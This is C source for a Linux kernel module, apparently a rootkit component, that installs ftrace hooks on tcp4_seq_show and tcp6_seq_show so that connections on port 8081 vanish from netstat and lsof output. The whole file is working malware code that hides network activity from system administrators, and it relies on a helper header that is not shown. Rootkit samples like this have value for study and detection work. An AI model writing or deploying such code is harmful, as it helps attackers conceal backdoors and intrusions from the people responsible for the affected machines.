#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/tcp.h>
#include "ftrace_helper.h"

#define PORT 8081               // Defines the port to be hidden (8081)

MODULE_LICENSE("GPL");        
MODULE_AUTHOR("mtzsec");        
MODULE_DESCRIPTION("Hiding connections from netstat and lsof"); 
MODULE_VERSION("1.0");        

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    long ret;
    struct sock *sk = v;
    
    if (sk != (struct sock *)0x1 && sk->sk_num == PORT)
    {
        printk(KERN_DEBUG "Port hidden!\n");
        return 0;
    }

    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}

static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    long ret;
    struct sock *sk = v;
    
    if (sk != (struct sock *)0x1 && sk->sk_num == PORT)
    {
        printk(KERN_DEBUG "Port hidden!\n");
        return 0;
    }

    ret = orig_tcp6_seq_show(seq, v);
    return ret;
}

static struct ftrace_hook new_hooks[] = {
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
};


static int __init hideport_init(void)
{
    int err; 
    err = fh_install_hooks(new_hooks, ARRAY_SIZE(new_hooks));
    if(err) 
        return err;

    return 0;
}

static void __exit hideport_exit(void)
{
    fh_remove_hooks(new_hooks, ARRAY_SIZE(new_hooks));
}

module_init(hideport_init);
module_exit(hideport_exit);
